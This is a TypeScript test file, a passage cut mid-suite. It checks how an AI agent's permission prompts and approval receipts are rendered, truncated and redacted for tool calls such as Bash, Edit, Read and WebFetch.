            capabilityId: 'skill.linkedin-posting.publish',
            displayName: 'LinkedIn posting',
            category: 'LinkedIn posting',
            risk: 'write',
            can: 'Publish posts through the selected LinkedIn posting skill.',
            cannot:
              'Use unrelated skills, credentials, settings, or broader commands.',
            credentialSource: 'skill_secret',
            implementationBindings: [
              {
                kind: 'tool_rule',
                rule: 'RunCommand(skills/linkedin-posting/publish *)',
              },
            ],
            preflight: { kind: 'none' },
            sandboxProfile: {
              network: 'required',
              filesystem: 'workspace_write',
            },
          },
        },
      },
      60_000,
    );

    expect(text).toContain('Allow Main Agent to use LinkedIn posting?');
    expect(text).toContain('Risk: Write');
  });

  it('does not trust free-form labels for unknown skill action capabilities', () => {
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'main_agent',
      toolName: 'Bash',
      toolInput: {
        command: 'python3 skills/linkedin-posting/post.py --file /tmp/post.md',
        capabilityId: 'skill.linkedin-posting.publish',
        capabilityDisplayName: 'LinkedIn posting',
      },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
        },
      ],
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(firstPersistentRule(request)).toBeUndefined();
    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'cancel',
    ]);
    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use exact command access?',
    );
    expect(text).not.toContain('Allow Main Agent to use LinkedIn posting?');
    expect(text).not.toContain('future matching runs');
  });

  it('renders typed tool input families without JSON dumps', () => {
    const edit = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Edit',
        toolInput: {
          file_path: '/repo/app.ts',
          old_string: 'const unsafe = true;',
          new_string: 'const unsafe = false;',
        },
      },
      60_000,
    );
    expect(edit).toContain('File: /repo/app.ts');
    expect(edit).toContain(
      '```diff\n-const unsafe = true;\n+const unsafe = false;\n```',
    );

    const read = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Read',
        toolInput: { file_path: '/repo/README.md' },
      },
      60_000,
    );
    expect(read).toContain('Path: /repo/README.md');
    expect(read).not.toContain('```json');

    const webFetch = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'WebFetch',
        toolInput: {
          url: 'https://example.com/docs',
          prompt: 'Summarize the setup section.',
        },
      },
      60_000,
    );
    expect(webFetch).toContain('URL: https://example.com/docs');
    expect(webFetch).toContain('Prompt: Summarize the setup section.');
  });

  it('renders unknown tool input as clean key/value lines (not a JSON dump), nested objects omitted', () => {
    const longValue = `lookup ${'x'.repeat(650)} tail`;
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'mcp__thirdparty__unknown',
        toolInput: { query: longValue, nested: { ok: true } },
      },
      60_000,
    );

    expect(text).toContain('Query: lookup ');
    expect(text).toContain('tail');
    expect(text).toContain('…'); // head/tail truncation of the long value
    expect(text).not.toContain('```json');
    // Nested objects are omitted from the prompt body.
    expect(text).not.toContain('nested');
  });

  it('renders any command-shaped permission input without a JSON dump', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'mcp__thirdparty__run',
        toolInput: { command: 'acme publish draft-123' },
      },
      60_000,
    );

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use exact command access?',
    );
    expect(text).toContain('Command:\n```');
    expect(text).toContain('acme publish draft-123');
    expect(text).not.toContain('```json');
  });

  it('echoes the approved action in once receipts', () => {
    const receipt = formatPermissionReceiptText(
      'perm-abc-123',
      {
        requestId: 'perm-abc-123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command: 'git status --short' },
      },
      {
        approved: true,
        mode: 'allow_once',
        decidedBy: 'ravi',
      },
    );

    expect(receipt).toContain(
      'Allowed once: Command (git status --short). The agent will continue this request.',
    );
    expect(receipt).not.toContain('From: agent chat');
    expect(receipt).not.toContain('Request ID');
    expect(receipt).not.toContain('perm-abc-123');
  });

  it('clarifies parent-conversation persistent grants from a routed thread', () => {
    const request = {
      ...requestWithSuggestions([
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'Bash', ruleContent: 'npm test *' }],
        },
      ]),
      threadId: 'topic-7',
      toolInput: { command: 'npm test' },
    } satisfies PermissionApprovalRequest;

    const prompt = formatPermissionPromptText(request, 60_000);
    expect(prompt).not.toContain('Scope:');

    const persistentReceipt = formatPermissionReceiptText(
      'perm-abc-123',
      request,
      {
        approved: true,
        mode: 'allow_persistent_rule',
      },
    );
    expect(persistentReceipt).toBe(
      'Allowed for future: Command (npm test). Saved for Kai Group. Manage access to revoke it later.',
    );
  });

  it('marks scheduled-job receipts without exposing job ids', () => {
    const receipt = formatPermissionReceiptText(
      'perm-abc-123',
      {
        requestId: 'perm-abc-123',
        sourceAgentFolder: 'main_agent',
        jobId: 'fixture-lead-maintenance-controller-2026-05-15',
        toolName: 'Bash',
        toolInput: { command: 'npm run lead-generator' },
      },
      {
        approved: true,
        mode: 'allow_once',
        decidedBy: 'ravi',
      },
    );

    expect(receipt).toContain(
      'Allowed once: Command (npm run lead-generator). The agent will continue this request.',
    );
    expect(receipt).not.toContain('From: scheduled job');
    expect(receipt).not.toContain(
      'fixture-lead-maintenance-controller-2026-05-15',
    );
    expect(receipt).not.toContain('perm-abc-123');
  });

  it('lists persistent rules and revoke hint in receipts', () => {
    const receipt = formatPermissionReceiptText(
      'perm-abc-123',
      {
        ...requestWithSuggestions([
          {
            type: 'addRules',
            behavior: 'allow',
            rules: [
              {
                toolName: 'Bash',
                ruleContent: 'curl https://api.example.com/*',
              },
              { toolName: 'Bash', ruleContent: 'jq -r *' },
              { toolName: 'Browser' },
            ],
          },
        ]),
        toolInput: { command: 'curl https://api.example.com/leads > /tmp/out' },
      },
      {
        approved: true,
        mode: 'allow_persistent_rule',
        decidedBy: 'ravi',
      },
    );

    expect(receipt).toContain(
      'Allowed for future: Command (curl https://api.example.com/leads > /tmp/out). Saved for Kai Group. Manage access to revoke it later.',
    );
    expect(receipt).not.toContain('RunCommand(curl https://api.example.com/*)');
    expect(receipt).not.toContain('RunCommand(jq -r *)');
    expect(receipt).not.toContain('Request ID');
    expect(receipt).not.toContain('perm-abc-123');
  });

  it('omits sensitive details instead of showing redaction markers in accepted receipts', () => {
    const receipt = formatPermissionReceiptText(
      'perm-abc-123',
      {
        requestId: 'perm-abc-123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: {
          command:
            'curl https://api.example.com -H "Authorization: bearer abcdefghijklmnopqrstuvwxyz123456"',
        },
      },
      {
        approved: true,
        mode: 'allow_once',
        decidedBy: 'ravi',
      },
    );

    expect(receipt).toContain('Allowed once: Command');
    expect(receipt).not.toContain('REDACTED');
    expect(receipt).not.toContain('abcdefghijklmnopqrstuvwxyz123456');
    expect(receipt).not.toContain('Request ID');
    expect(receipt).not.toContain('perm-abc-123');
  });

  it('bounds and redacts prompt-visible free text and unknown input previews', () => {
    const wideInput: Record<string, unknown> = {
      cookie: 'session-cookie-value',
      safe: 'visible',
      huge: 'z'.repeat(10_000),
    };
    for (let index = 0; index < 100; index += 1) {
      wideInput[`extra_${index}`] = `value_${index}`;
    }
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'mcp__thirdparty__unknown',
        decisionReason: `needs token=abc12345678901234567890 ${'x'.repeat(4_000)}`,
        description: `password: top-secret-value ${'y'.repeat(4_000)}`,
        toolInput: wideInput,
      },
      60_000,
    );

    expect(text.length).toBeLessThanOrEqual(2_800);
    expect(text).not.toContain('Reason:');
    expect(text).not.toContain('Details:');
    expect(text).toContain('Cookie: [hidden]'); // sensitive key hidden
    expect(text).toContain('Safe: visible');
    expect(text).toContain('…'); // field cap / value truncation marker
    expect(text).not.toContain('REDACTED');
    expect(text).not.toContain('session-cookie-value');
    expect(text).not.toContain('top-secret-value');
    expect(text).not.toContain('extra_99'); // capped at PERMISSION_JSON_MAX_KEYS
  });

  it('rejects oversized persistent suggestion rule sets', () => {
    const rules = Array.from({ length: 100 }, (_, index) => ({
      toolName: 'Bash',
      ruleContent: index === 0 ? 'git status' : `echo rule-${index}`,
    }));
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'main_agent',
      toolName: 'Bash',
      suggestions: [
        {
          type: 'addRules' as const,
          behavior: 'allow' as const,
          rules,
        },
      ],
    };

    expect(persistentRules(request)).toEqual([]);
    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'cancel',
    ]);
  });

  it('preserves long command head and tail in prompt and receipt summaries', () => {
    const command = `curl https://api.example.com/${'a'.repeat(1_300)} > /tmp/out`;
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command },
      },
      60_000,
    );
    const receipt = formatPermissionReceiptText(
      'permission_123',
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command },
      },
      { approved: true, mode: 'allow_once' },
    );

    expect(text).toContain('curl https://api.example.com/');
    expect(text).toContain('> /tmp/out');
    expect(receipt).toContain('curl https://api.example.com/');
    expect(receipt).toContain('> /tmp/out');
  });
});
